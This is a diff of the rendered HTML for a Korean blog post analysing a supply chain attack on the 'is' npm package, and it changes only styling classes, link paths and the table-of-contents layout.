+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#F07178">    scripts</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF"> /</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">_ npm scripts </span><span style="--shiki-light:#22863A;--shiki-light-font-weight:bold;--shiki-dark:#BABED8;--shiki-dark-font-weight:inherit">\_</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">/</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">  }</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">};</span></span>
 <span data-line=""> </span></code></pre>
           </figure>
         </div>
@@ -844,7 +1189,7 @@
           href="#5-웹-소켓-호출"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >5. 웹 소켓 호출
       </h3>
@@ -878,7 +1223,7 @@
           href="#소켓이-연결-되면-아래와-같은-문제가-생긴다"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >소켓이 연결 되면 아래와 같은 문제가 생긴다
       </h4>
@@ -898,7 +1243,7 @@
       <p class="mt-4 mb-4">(대충 멸망)</p>
       <h2
         id="방어-방법"
-        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-[hsl(210deg_18%_87%_/100%)]"
+        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-base/50"
       >
         <a
           aria-hidden="true"
@@ -906,7 +1251,7 @@
           href="#방어-방법"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >방어 방법
       </h2>
@@ -916,7 +1261,7 @@
           <ul class="min-[790px]:ml-6 ml-4 list-disc">
             <li class="my-1.25">
               <a
-                href="/posts/renovate"
+                href="/post/renovate"
                 class="underline-highlight-fade"
                 target="_blank"
                 rel="noreferrer noopener"
@@ -938,7 +1283,7 @@
       </ul>
       <h2
         id="시사점"
-        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-[hsl(210deg_18%_87%_/100%)]"
+        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-base/50"
       >
         <a
           aria-hidden="true"
@@ -946,7 +1291,7 @@
           href="#시사점"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >시사점
       </h2>
@@ -960,7 +1305,7 @@
           href="#1-의존성-하나가-전체-앱의-보안에-영향을-줄-수-있다"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >1. 의존성 하나가 전체 앱의 보안에 영향을 줄 수 있다
       </h3>
@@ -983,7 +1328,7 @@
           href="#2-계정-탈취는-생각보다-흔하다"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >2. 계정 탈취는 생각보다 흔하다
       </h3>
@@ -1005,7 +1350,7 @@
           href="#3-잠재적-위험-탐지-도구-사용"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >3. 잠재적 위험 탐지 도구 사용
       </h3>
@@ -1034,7 +1379,7 @@
       </p>
       <p class="mt-4 mb-4">
         <a
-          href="/posts/renovate"
+          href="/post/renovate"
           class="underline-highlight-fade"
           target="_blank"
           rel="noreferrer noopener"
@@ -1043,7 +1388,7 @@
       </p>
       <h2
         id="마치며"
-        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-[hsl(210deg_18%_87%_/100%)]"
+        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-base/50"
       >
         <a
           aria-hidden="true"
@@ -1051,7 +1396,7 @@
           href="#마치며"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >마치며
       </h2>
@@ -1069,7 +1414,7 @@
       </p>
       <h2
         id="참고"
-        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-[hsl(210deg_18%_87%_/100%)]"
+        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-base/50"
       >
         <a
           aria-hidden="true"
@@ -1077,7 +1422,7 @@
           href="#참고"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >참고
       </h2>
@@ -1106,166 +1451,231 @@
       class="absolute top-0 inline-block h-full break-words left-full max-xl:hidden"
       aria-label="목차"
     >
-      <ul
-        class="ml-9 sticky pl-4 top-32 w-[calc(50vw-35vw)] border-l-2 border-l-base min-[1320px]:ml-20 min-[1320px]:top-48"
+      <div
+        class="sticky top-32 ml-9 w-[216px] min-[1320px]:top-48 min-[1320px]:ml-20"
       >
-        <li class="pt-0.5 text-base select-none mb-0.5">
-          <a
-            id="들어가며"
-            href="#들어가며"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >들어가며</a
+        <p class="mb-2 px-3 text-[10px] tracking-[0.18em] text-dark uppercase">
+          On this page
+        </p>
+        <ul>
+          <li class="relative select-none">
+            <a
+              id="들어가며"
+              href="#들어가며"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors gap-2 px-3 py-2 text-[13px] border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span aria-hidden="true" class="flex-none text-dark">#</span
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >들어가며</span
+              ></a
+            >
+          </li>
+          <li class="relative select-none">
+            <a
+              id="tldr-무슨-일이-벌어졌나"
+              href="#tldr-무슨-일이-벌어졌나"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors gap-2 px-3 py-2 text-[13px] border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span aria-hidden="true" class="flex-none text-dark">#</span
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >TL;DR: 무슨 일이 벌어졌나?</span
+              ></a
+            >
+          </li>
+          <li class="relative select-none">
+            <a
+              id="공급망-공격이란"
+              href="#공급망-공격이란"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors gap-2 px-3 py-2 text-[13px] border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span aria-hidden="true" class="flex-none text-dark">#</span
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >공급망 공격이란?</span
+              ></a
+            >
+          </li>
+          <li class="relative select-none">
+            <a
+              id="메인테이너-계정-탈취-과정"
+              href="#메인테이너-계정-탈취-과정"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors gap-2 px-3 py-2 text-[13px] border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span aria-hidden="true" class="flex-none text-dark">#</span
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >메인테이너 계정 탈취 과정</span
+              ></a
+            >
+          </li>
+          <li class="relative select-none">
+            <a
+              id="공격-코드-분석"
+              href="#공격-코드-분석"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors gap-2 px-3 py-2 text-[13px] border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span aria-hidden="true" class="flex-none text-dark">#</span
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >공격 코드 분석</span
+              ></a
+            >
+          </li>
+          <li
+            class="relative select-none before:absolute before:left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
           >
-        </li>
-        <li class="pt-0.5 text-base select-none mb-0.5">
-          <a
-            id="tldr-무슨-일이-벌어졌나"
-            href="#tldr-무슨-일이-벌어졌나"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >TL;DR: 무슨 일이 벌어졌나?</a
+            <a
+              id="1-패키지-설치와-postinstall"
+              href="#1-패키지-설치와-postinstall"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors py-1.5 pr-3 pl-8 text-xs border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >1. 패키지 설치와 postinstall</span
+              ></a
+            >
+          </li>
+          <li
+            class="relative select-none before:absolute before:left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
           >
-        </li>
-        <li class="pt-0.5 text-base select-none mb-0.5">
-          <a
-            id="공급망-공격이란"
-            href="#공급망-공격이란"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >공급망 공격이란?</a
+            <a
+              id="2-동적-함수-선언과-실행"
+              href="#2-동적-함수-선언과-실행"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors py-1.5 pr-3 pl-8 text-xs border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >2. 동적 함수 선언과 실행</span
+              ></a
+            >
+          </li>
+          <li
+            class="relative select-none before:absolute before:left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
           >
-        </li>
-        <li class="pt-0.5 text-base select-none mb-0.5">
-          <a
-            id="메인테이너-계정-탈취-과정"
-            href="#메인테이너-계정-탈취-과정"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >메인테이너 계정 탈취 과정</a
+            <a
+              id="3-예약어-기만"
+              href="#3-예약어-기만"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors py-1.5 pr-3 pl-8 text-xs border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >3. 예약어 기만</span
+              ></a
+            >
+          </li>
+          <li
+            class="relative select-none before:absolute before:left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
           >
-        </li>
-        <li class="pt-0.5 text-base select-none mb-0.5">
-          <a
-            id="공격-코드-분석"
-            href="#공격-코드-분석"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >공격 코드 분석</a
+            <a
+              id="4-전역-객체-접근-함수-선언"
+              href="#4-전역-객체-접근-함수-선언"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors py-1.5 pr-3 pl-8 text-xs border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >4. 전역 객체 접근 함수 선언</span
+              ></a
+            >
+          </li>
+          <li
+            class="relative select-none before:absolute before:left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-1/2"
           >
-        </li>
-        <li
-          class="pt-0.5 text-base select-none before:content-['-'] before:mr-1 ml-2.5"
-        >
-          <a
-            id="1-패키지-설치와-postinstall"
-            href="#1-패키지-설치와-postinstall"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >1. 패키지 설치와 postinstall</a
+            <a
+              id="5-웹-소켓-호출"
+              href="#5-웹-소켓-호출"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors py-1.5 pr-3 pl-8 text-xs border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >5. 웹 소켓 호출</span
+              ></a
+            >
+          </li>
+          <li class="relative select-none">
+            <a
+              id="방어-방법"
+              href="#방어-방법"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors gap-2 px-3 py-2 text-[13px] border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span aria-hidden="true" class="flex-none text-dark">#</span
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >방어 방법</span
+              ></a
+            >
+          </li>
+          <li class="relative select-none">
+            <a
+              id="시사점"
+              href="#시사점"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors gap-2 px-3 py-2 text-[13px] border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span aria-hidden="true" class="flex-none text-dark">#</span
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >시사점</span
+              ></a
+            >
+          </li>
+          <li
+            class="relative select-none before:absolute before:left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
           >
-        </li>
-        <li
-          class="pt-0.5 text-base select-none before:content-['-'] before:mr-1 ml-2.5"
-        >
-          <a
-            id="2-동적-함수-선언과-실행"
-            href="#2-동적-함수-선언과-실행"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >2. 동적 함수 선언과 실행</a
+            <a
+              id="1-의존성-하나가-전체-앱의-보안에-영향을-줄-수-있다"
+              href="#1-의존성-하나가-전체-앱의-보안에-영향을-줄-수-있다"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors py-1.5 pr-3 pl-8 text-xs border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >1. 의존성 하나가 전체 앱의 보안에 영향을 줄 수 있다</span
+              ></a
+            >
+          </li>
+          <li
+            class="relative select-none before:absolute before:left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
           >
-        </li>
-        <li
-          class="pt-0.5 text-base select-none before:content-['-'] before:mr-1 ml-2.5"
-        >
-          <a
-            id="3-예약어-기만"
-            href="#3-예약어-기만"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >3. 예약어 기만</a
+            <a
+              id="2-계정-탈취는-생각보다-흔하다"
+              href="#2-계정-탈취는-생각보다-흔하다"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors py-1.5 pr-3 pl-8 text-xs border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >2. 계정 탈취는 생각보다 흔하다</span
+              ></a
+            >
+          </li>
+          <li
+            class="relative select-none before:absolute before:left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-1/2"
           >
-        </li>
-        <li
-          class="pt-0.5 text-base select-none before:content-['-'] before:mr-1 ml-2.5"
-        >
-          <a
-            id="4-전역-객체-접근-함수-선언"
-            href="#4-전역-객체-접근-함수-선언"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >4. 전역 객체 접근 함수 선언</a
-          >
-        </li>
-        <li
-          class="pt-0.5 text-base select-none before:content-['-'] before:mr-1 ml-2.5 mb-1.5"
-        >
-          <a
-            id="5-웹-소켓-호출"
-            href="#5-웹-소켓-호출"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >5. 웹 소켓 호출</a
-          >
-        </li>
-        <li class="pt-0.5 text-base select-none mb-0.5">
-          <a
-            id="방어-방법"
-            href="#방어-방법"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >방어 방법</a
-          >
-        </li>
-        <li class="pt-0.5 text-base select-none mb-0.5">
-          <a
-            id="시사점"
-            href="#시사점"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >시사점</a
-          >
-        </li>
-        <li
-          class="pt-0.5 text-base select-none before:content-['-'] before:mr-1 ml-2.5"
-        >
-          <a
-            id="1-의존성-하나가-전체-앱의-보안에-영향을-줄-수-있다"
-            href="#1-의존성-하나가-전체-앱의-보안에-영향을-줄-수-있다"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >1. 의존성 하나가 전체 앱의 보안에 영향을 줄 수 있다</a
-          >
-        </li>
-        <li
-          class="pt-0.5 text-base select-none before:content-['-'] before:mr-1 ml-2.5"
-        >
-          <a
-            id="2-계정-탈취는-생각보다-흔하다"
-            href="#2-계정-탈취는-생각보다-흔하다"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >2. 계정 탈취는 생각보다 흔하다</a
-          >
-        </li>
-        <li
-          class="pt-0.5 text-base select-none before:content-['-'] before:mr-1 ml-2.5 mb-1.5"
-        >
-          <a
-            id="3-잠재적-위험-탐지-도구-사용"
-            href="#3-잠재적-위험-탐지-도구-사용"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >3. 잠재적 위험 탐지 도구 사용</a
-          >
-        </li>
-        <li class="pt-0.5 text-base select-none mb-0.5">
-          <a
-            id="마치며"
-            href="#마치며"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >마치며</a
-          >
-        </li>
-        <li class="pt-0.5 text-base select-none mb-0.5">
-          <a
-            id="참고"
-            href="#참고"
-            class="cursor-pointer inline hover:text-sub-blue"
-            >참고</a
-          >
-        </li>
-      </ul>
+            <a
+              id="3-잠재적-위험-탐지-도구-사용"
+              href="#3-잠재적-위험-탐지-도구-사용"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors py-1.5 pr-3 pl-8 text-xs border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >3. 잠재적 위험 탐지 도구 사용</span
+              ></a
+            >
+          </li>
+          <li class="relative select-none">
+            <a
+              id="마치며"
+              href="#마치며"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors gap-2 px-3 py-2 text-[13px] border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span aria-hidden="true" class="flex-none text-dark">#</span
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >마치며</span
+              ></a
+            >
+          </li>
+          <li class="relative select-none">
+            <a
+              id="참고"
+              href="#참고"
+              class="group flex w-full cursor-pointer items-start border text-left leading-snug transition-colors gap-2 px-3 py-2 text-[13px] border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              ><span aria-hidden="true" class="flex-none text-dark">#</span
+              ><span
+                class="line-clamp-2 origin-left transition-[color,scale] duration-300 ease-out motion-reduce:transition-none scale-100"
+                >참고</span
+              ></a
+            >
+          </li>
+        </ul>
+      </div>
     </aside>
   </section>
   <a
-    class="inline-block text-[#30ffcb] leading-[1.1] after:transition-[width] after:duration-500 ease-in-out hover:after:w-[100%] after:w-0 after:block after:h-[1px] print:text-black print:underline after:bg-[#30ffcb] after:content-[&quot;&quot;] mt-24 [&amp;&amp;]:text-transparent bg-rainbow-water bg-clip-text bg-[length:400%_400%] animate-rainbow-water"
+    class="inline-block text-highlight leading-[1.1] after:transition-[width] after:duration-500 ease-in-out hover:after:w-[100%] after:w-0 after:block after:h-[1px] print:text-black print:underline after:bg-highlight after:content-[&quot;&quot;] mt-24 [&amp;&amp;]:text-transparent bg-rainbow-water bg-clip-text bg-[length:400%_400%] animate-rainbow-water"
     href="https://github.com/1ilsang/dev/issues/new?labels=🧊 comment&amp;assignees=1ilsang&amp;title=[🧊] is%20%ED%8C%A8%ED%82%A4%EC%A7%80%EC%9D%98%20Supply%20Chain%20Attack%20%EA%B3%BC%EC%A0%95%20%EB%B6%84%EC%84%9D&amp;body=&lt;!-- 환영합니다. 이슈 남겨주시면 빠르게 답변드리겠습니다. 🙇 --&gt;"
     rel="noopener noreferrer"
     target="_blank"
@@ -1288,14 +1698,14 @@
       <a
         class="group flex flex-col gap-1 max-w-[45%] hover:text-highlight duration-300 items-start text-left"
         aria-label="이전 글: Node.js 아키텍처 및 동작 분석"
-        href="/posts/nodejs-architecture-dive"
+        href="/post/nodejs-architecture-dive"
         ><span class="text-sm text-date-gray">← 이전 글</span
         ><span class="title-underline">Node.js 아키텍처 및 동작 분석</span></a
       >
       <div></div>
     </div>
   </nav>
-  <section aria-labelledby="related-posts-heading" class="mt-12 mb-40">
+  <section aria-labelledby="related-posts-heading" class="mt-12 mb-12 xl:mb-0">
     <h2 id="related-posts-heading" class="text-2xl mb-4">더 보기</h2>
     <ul>
       <li
@@ -1304,7 +1714,7 @@
         <a
           class="flex flex-col items-center md:flex-row"
           aria-describedby="related-post-nodejs-architecture-dive-description"
-          href="/posts/nodejs-architecture-dive"
+          href="/post/nodejs-architecture-dive"
           ><div
             class="relative mr-4 overflow-hidden border rounded-sm h-24 w-44 min-w-44 border-white-blue"
           >
@@ -1319,18 +1729,18 @@
           </div>
           <div class="w-full mt-2 md:mt-0">
             <h3
-              class="text-xl mb-1.5 title-underline transform-gpu group-hover:text-snazzy-bg"
+              class="text-xl mb-1.5 title-underline transform-gpu group-hover:text-on-vibrant"
             >
               Node.js 아키텍처 및 동작 분석
             </h3>
             <p
               id="related-post-nodejs-architecture-dive-description"
-              class="text-white-blue group-hover:text-snazzy-bg line-clamp-2"
+              class="text-white-blue group-hover:text-on-vibrant line-clamp-2"
             >
               노드 내부 의존성의 존재의의와 연결성을 코드로 알아보기
             </p>
             <time
-              class="text-sub-blue group-hover:text-snazzy-bg"
+              class="text-sub-blue group-hover:text-on-vibrant"
               datetime="2025-03-24 21:27"
               >2025-03-24 21:27</time
             >
@@ -1343,7 +1753,7 @@
         <a
           class="flex flex-col items-center md:flex-row"
           aria-describedby="related-post-n-api-description"
-          href="/posts/n-api"
+          href="/post/n-api"
           ><div
             class="relative mr-4 overflow-hidden border rounded-sm h-24 w-44 min-w-44 border-white-blue"
           >
@@ -1358,18 +1768,18 @@
           </div>
           <div class="w-full mt-2 md:mt-0">
             <h3
-              class="text-xl mb-1.5 title-underline transform-gpu group-hover:text-snazzy-bg"
+              class="text-xl mb-1.5 title-underline transform-gpu group-hover:text-on-vibrant"
             >
               N-API(Node-API) 얕게 알아보기(feat. Rust)
             </h3>
             <p
               id="related-post-n-api-description"
-              class="text-white-blue group-hover:text-snazzy-bg line-clamp-2"
+              class="text-white-blue group-hover:text-on-vibrant line-clamp-2"
             >
               N-API를 이해하고 Node.js Addon에 Rust를 붙이는 방법을 알아보자.
             </p>
             <time
-              class="text-sub-blue group-hover:text-snazzy-bg"
+              class="text-sub-blue group-hover:text-on-vibrant"
               datetime="2025-03-16 21:37"
               >2025-03-16 21:37</time
             >
@@ -1382,7 +1792,7 @@
         <a
           class="flex flex-col items-center md:flex-row"
           aria-describedby="related-post-jeju-remote-work-description"
-          href="/posts/jeju-remote-work"
+          href="/post/jeju-remote-work"
           ><div
             class="relative mr-4 overflow-hidden border rounded-sm h-24 w-44 min-w-44 border-white-blue"
           >
@@ -1400,18 +1810,18 @@
               >다른 주제 탐색</span
             >
             <h3
-              class="text-xl mb-1.5 title-underline transform-gpu group-hover:text-snazzy-bg"
+              class="text-xl mb-1.5 title-underline transform-gpu group-hover:text-on-vibrant"
             >
               제주 한 달 리모트 워크 후기
             </h3>
             <p
               id="related-post-jeju-remote-work-description"
-              class="text-white-blue group-hover:text-snazzy-bg line-clamp-2"
+              class="text-white-blue group-hover:text-on-vibrant line-clamp-2"
             >
               제주 한 달 살기 얼마나 낭만 있을까?
             </p>
             <time
-              class="text-sub-blue group-hover:text-snazzy-bg"
+              class="text-sub-blue group-hover:text-on-vibrant"
               datetime="2023-09-16 12:19"
               >2023-09-16 12:19</time
             >
@@ -1424,7 +1834,7 @@
         <a
           class="flex flex-col items-center md:flex-row"
           aria-describedby="related-post-leetcode-medium-238-description"
-          href="/posts/leetcode-medium-238"
+          href="/post/leetcode-medium-238"
           ><div
             class="relative mr-4 overflow-hidden border rounded-sm h-24 w-44 min-w-44 border-white-blue"
           >
@@ -1442,18 +1852,18 @@
               >다른 주제 탐색</span
             >
             <h3
-              class="text-xl mb-1.5 title-underline transform-gpu group-hover:text-snazzy-bg"
+              class="text-xl mb-1.5 title-underline transform-gpu group-hover:text-on-vibrant"
             >
               [LeetCode] 238. Product of Array Except Self
             </h3>
             <p
               id="related-post-leetcode-medium-238-description"
-              class="text-white-blue group-hover:text-snazzy-bg line-clamp-2"
+              class="text-white-blue group-hover:text-on-vibrant line-clamp-2"
             >
               연속되는 곱셈을 어떻게 처리할까?
             </p>
             <time
-              class="text-sub-blue group-hover:text-snazzy-bg"
+              class="text-sub-blue group-hover:text-on-vibrant"
               datetime="2023-08-13 22:31"
               >2023-08-13 22:31</time
             >
